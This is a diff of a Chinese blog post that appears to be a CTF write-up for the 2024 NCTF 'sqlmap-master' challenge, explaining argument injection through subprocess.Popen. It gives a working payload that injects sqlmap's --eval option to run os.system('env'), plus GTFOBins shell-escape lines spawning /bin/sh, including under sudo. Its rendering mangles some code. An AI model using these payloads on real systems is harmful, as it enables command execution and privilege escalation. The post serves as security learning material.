@@ -26,13 +26,14 @@
 <meta property="og:site_name" content="sakula33">
 <meta property="og:description" content="艰难的比赛，来跟着官方wp复现学习一下 1.sqlmap-master 首先查看题目，给了附件和环境。 首先打开环境，是一个类似于sqlmap的一个界面。 附件当中给了源代码，我们查看一下。  我们发现其中有一个很明显的subprocess.Popen()函数 (1)subprocess.Popen:（subprocess.popen是python标准库中的一个模块，用于启动和管理子进程。它可以执">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://sakula33.github.io/2025/03/25/2024NCTF/2024NCTF/sqlmaster1.png">
+<meta property="og:image" content="https://sakula33.github.io/images/2024NCTF/sqlmap1.png">
+<meta property="og:image" content="https://sakula33.github.io/images/2024NCTF/sqlmap2.png">
 <meta property="article:published_time" content="2025-03-25T09:12:07.000Z">
-<meta property="article:modified_time" content="2025-03-26T10:18:00.911Z">
+<meta property="article:modified_time" content="2025-03-26T10:35:37.157Z">
 <meta property="article:author" content="sakula33">
 <meta property="article:tag" content="原创">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://sakula33.github.io/2025/03/25/2024NCTF/2024NCTF/sqlmaster1.png">
+<meta name="twitter:image" content="https://sakula33.github.io/images/2024NCTF/sqlmap1.png">
   
   
   
@@ -245,7 +246,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.3k 字
+          1.7k 字
         
       </span>
     
@@ -256,7 +257,7 @@
         
         
         
-          11 分钟
+          15 分钟
         
       </span>
     
@@ -303,12 +304,11 @@
 <p>首先查看题目，给了附件和环境。</p>
 <p>首先打开环境，是一个类似于sqlmap的一个界面。</p>
 <p>附件当中给了源代码，我们查看一下。</p>
-<p><img src="2024NCTF/sqlmaster1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/2024NCTF/sqlmap1.png" srcset="/img/loading.gif" lazyload></p>
 <p>我们发现其中有一个很明显的subprocess.Popen()函数</p>
 <p>(1)subprocess.Popen:<br>（subprocess.popen是python标准库中的一个模块，用于启动和管理子进程。它可以执行外部命令并捕获其输出。）</p>
 <p>以下是subprocess.Popen的典型用法：</p>
 <pre>
-<code>
 import subprocess
 
 # 启动一个子进程，执行命令 "ls -l"
@@ -321,7 +321,6 @@ process = subprocess.Popen(
 # 读取命令的输出
 output, _ = process.communicate()
 print(output.decode())
-</code>
 </pre>
 
 <p><b>args</b>:要执行的命令及其参数。可以是一个字符串列表（如<b>[‘ls’,’-l’]</b>）或者单个字符串（但需要设置shell&#x3D;True）.</p>
@@ -330,93 +329,115 @@ print(output.decode())
 <p>如果 shell&#x3D;True，则存在命令注入风险，因为用户输入可能会被直接拼接到 shell 命令中。<br>如果 shell&#x3D;False，则相对安全，但仍需确保用户输入的参数经过严格校验。</p>
 <p>学习了一下，那么回到这个题目，我们看到了设置了shell&#x3D;Flase,导致我们无法利用正常的命令注入</p>
 <p>但是我们可以看到我们可以控制sqlmap的参数，即参数注入。<br>结合GTFOBins:<br><b><br>Shell<br>它可用于通过生成交互式系统shell来摆脱受限环境</b></p>
-<pre>
 <code>
 sqlmap -u 127.0.0.1 --eval="import os; os.system('/bin/sh')"
 </code>
 
-Sudo
-如果二进制文件被允许以超级用户身份运行sudo,它不会降低提升的权限，并且可能用于访问文件系统，升级或维护特权访问。
-
+<p>Sudo</p>
+<p>如果二进制文件被允许以超级用户身份运行sudo,它不会降低提升的权限，并且可能用于访问文件系统，升级或维护特权访问。</p>
 <code>
 sudo sqlmap -u 127.0.0.1 --eval="import os; os.system('/bin/sh')"）
 </code>
-</pre>
+
 
 <p>通过–eval参数可以执行Python代码，然而因为上面command.split()默认是按空格分隔的，所以需要一些技巧绕过</p>
 <p>注意这⾥参数的值不需要加上单双引号, 因为上⾯已经设置了 shell&#x3D;False , 如果加上去反⽽代表的是 “eval ⼀个 Python 字符串”</p>
 <p>解释：</p>
-<pre>
+<b>
 1. command.split() 的作用
-在后端代码中，command.split() 是用来将用户输入的字符串按空格分割成一个列表的。例如：
 
+<p>在后端代码中，command.split() 是用来将用户输入的字符串按空格分割成一个列表的。例如：</p>
 <code>
 command = f'sqlmap -u &#123;url&#125; --batch --flush-session'
 </code>
-如果用户输入的 url 是：
 
-plaintext
-深色版本
-127.0.0.1:8000 --eval __import__('os').system('env')
-那么 command.split() 将会把整个命令分割成以下列表：
-
-python
-深色版本
-['sqlmap', '-u', '127.0.0.1:8000', '--eval', '__import__(\'os\').system(\'env\')', '--batch', '--flush-session']
-注意点
---eval 后面的内容（即 __import__('os').system('env')）会被当作一个整体参数传递给 sqlmap。
-这是因为 split() 默认以空格为分隔符，并且不会对内容进行额外处理。
-2. 为什么需要“一些小技巧来绕过”？
-由于 command.split() 按空格分割，恶意输入中的空格可能会导致参数解析错误。例如：
-
-plaintext
-深色版本
-127.0.0.1:8000 --eval __import__('os').system('whoami')
-这里的 --eval 参数值包含了空格（'os' 和 'whoami' 中的单引号和括号），这可能会导致 split() 错误地将参数分割成多个部分，从而破坏命令结构。
-
-解决方法
-为了避免这种情况，我们需要确保 --eval 参数的值是一个完整的 Python 表达式，且不包含多余的空格或特殊字符。例如：
-
-plaintext
-深色版本
-127.0.0.1:8000 --eval __import__('os').system('env')
-这里的关键是：
-
-使用 __import__ 动态导入模块，避免直接引用模块名。
-确保整个表达式没有多余的空格或换行。
-3. 为什么不需要加引号？
-在 Python 的 subprocess.Popen 中，shell=False 是默认设置。这意味着命令参数会直接传递给底层的操作系统调用，而不会经过 shell 解释。
-
-(1) 如果加上引号会发生什么？
-假设我们在 --eval 参数值上加上引号，例如：
-
-plaintext
-深色版本
-127.0.0.1:8000 --eval "__import__('os').system('env')"
-后端代码会将其分割成以下列表：
-
-python
-深色版本
+<p>如果用户输入的 url 是：</p>
+<p><code>127.0.0.1:8000 --eval <strong>import</strong>('os').system('env')</code></p>
+<p>那么 command.split() 将会把整个命令分割成以下列表：</p>
+<p>[‘sqlmap’, ‘-u’, ‘127.0.0.1:8000’, ‘–eval’, ‘<strong>import</strong>(&#39;os&#39;).system(&#39;env&#39;)’, ‘–batch’, ‘–flush-session’]</p>
+<p>注意点:</p>
+<p>–eval 后面的内容（即 <strong>import</strong>(‘os’).system(‘env’)）会被当作一个整体参数传递给 sqlmap。<br>这是因为 split() 默认以空格为分隔符，并且不会对内容进行额外处理。</p>
+<ol start="2">
+<li>为什么需要“一些小技巧来绕过”？</li>
+</ol>
+<p>由于 command.split() 按空格分割，恶意输入中的空格可能会导致参数解析错误。例如：</p>
+<p><code>127.0.0.1:8000 --eval <strong>import</strong>('os').system('whoami')</code></p>
+<p>这里的 –eval 参数值包含了空格（’os’ 和 ‘whoami’ 中的单引号和括号），这可能会导致 split() 错误地将参数分割成多个部分，从而破坏命令结构。</p>
+<p>解决方法:</p>
+<p>为了避免这种情况，我们需要确保 –eval 参数的值是一个完整的 Python 表达式，且不包含多余的空格或特殊字符。例如：</p>
+<p><code>127.0.0.1:8000 --eval <strong>import</strong>('os').system('env')</code></p>
+<p>这里的关键是：</p>
+<p>使用 <strong>import</strong> 动态导入模块，避免直接引用模块名。确保整个表达式没有多余的空格或换行。</p>
+<ol start="3">
+<li>为什么不需要加引号？</li>
+</ol>
+<p>在 Python 的 subprocess.Popen 中，shell&#x3D;False 是默认设置。这意味着命令参数会直接传递给底层的操作系统调用，而不会经过 shell 解释。</p>
+<p>(1) 如果加上引号会发生什么？</p>
+<p>假设我们在 –eval 参数值上加上引号，例如：</p>
+<p><code>127.0.0.1:8000 --eval "<strong>import</strong>('os').system('env')"</code></p>
+<p>后端代码会将其分割成以下列表：</p>
+<code>
 ['sqlmap', '-u', '127.0.0.1:8000', '--eval', '"__import__(\'os\').system(\'env\')"', '--batch', '--flush-session']
-此时，--eval 的值变成了一个带有双引号的字符串：
+</code>
 
-plaintext
-深色版本
-"__import__('os').system('env')"
-这会导致 sqlmap 将整个字符串当作一个普通的 Python 字符串来执行，而不是实际运行其中的代码。
-
-(2) 不加引号的正确行为
-如果不加引号，--eval 参数值会直接作为 Python 代码传递给 sqlmap，例如：
-
-plaintext
-深色版本
-127.0.0.1:8000 --eval __import__('os').system('env')
-后端代码会将其分割成以下列表：
-
-python
-深色版本
+<p>此时，–eval 的值变成了一个带有双引号的字符串：</p>
+<p><code>"<strong>import</strong>('os').system('env')"</code></p>
+<p>这会导致 sqlmap 将整个字符串当作一个普通的 Python 字符串来执行，而不是实际运行其中的代码。</p>
+<p>(2) 不加引号的正确行为</p>
+<p>如果不加引号，–eval 参数值会直接作为 Python 代码传递给 sqlmap，例如：</p>
+<p><code>127.0.0.1:8000 --eval <strong>import</strong>('os').system('env')</code></p>
+<p>后端代码会将其分割成以下列表：</p>
+<code>
 ['sqlmap', '-u', '127.0.0.1:8000', '--eval', '__import__(\'os\').system(\'env\')', '--batch', '--flush-session']
-此时，--eval 的值是一个合法的 Python 表达式，sqlmap 会在运行时执行它。</pre>
+</code>
+
+<p>此时，–eval 的值是一个合法的 Python 表达式，sqlmap 会在运行时执行它。<br></p></b><p></p>
+<p>最终 payload:</p>
+<p><code>127.0.0.1:8000 --eval <strong>import</strong>('os').system('env')</code></p>
+<p>解释：</p>
+<ol>
+<li>env 命令</li>
+</ol>
+<p>env 是一个 Unix&#x2F;Linux 系统中的内置命令，用于显示当前环境变量或在特定环境中运行程序。</p>
+<p>功能</p>
+<p>查看环境变量：当单独执行 env 时，它会列出当前 shell 中的所有环境变量。例如：</p>
+<code>
+$ env
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+HOME=/root
+USER=root
+</code>
+
+<p>运行程序：env 还可以用来在修改环境变量的情况下运行指定的程序。例如：</p>
+<p><code>$ env VAR=value myprogram</code></p>
+<p>上述命令会在 VAR&#x3D;value 的环境下运行 myprogram。</p>
+<p>用途：</p>
+<p>在渗透测试中，env 常被用来快速获取目标系统的环境信息（如路径、用户权限等），这些信息可能对进一步攻击有帮助。</p>
+
+
+<p>传入我们的playload之后就能得到flag了</p>
+<p><img src="/images/2024NCTF/sqlmap2.png" srcset="/img/loading.gif" lazyload></p>
+<p>总结：</p>
+<ol>
+<li>漏洞原理</li>
+</ol>
+<p>后端使用 subprocess.Popen 执行 sqlmap 命令。</p>
+<p>虽然设置了 shell&#x3D;False，但用户可以通过控制 url 参数来注入额外的参数（如 –eval）。</p>
+<p>–eval 是 sqlmap 提供的一个合法参数，用于在每次 HTTP 请求之前执行指定的 Python 代码。</p>
+<p>结合 GTFOBins 中的技巧，可以通过 <strong>import</strong>(‘os’).system() 执行任意系统命令。</p>
+<ol start="2">
+<li>构造 Payload</li>
+</ol>
+<p>最终的 Payload 是：</p>
+<p>127.0.0.1:8000 –eval <strong>import</strong>(‘os’).system(‘env’)</p>
+<p>解释</p>
+<p>127.0.0.1:8000 是一个合法的目标 URL（可以替换为其他有效的 URL）。</p>
+<p>–eval 是 sqlmap 的参数，允许我们注入 Python 代码。<br>__<br>import__(‘os’).system(‘env’) 是 Python 的动态导入机制，调用 os.system 执行系统命令 env。</p>
+<p>后端执行的命令</p>
+<p>后端会将输入拼接到 sqlmap 命令中，最终执行如下命令：</p>
+<p>sqlmap -u 127.0.0.1:8000 –eval <strong>import</strong>(‘os’).system(‘env’) –batch –flush-session</p>
+<p>由于 –eval 参数的存在，sqlmap 会在运行时执行我们注入的 Python 代码，从而触发命令执行。</p>
+
                 
               </div>
             
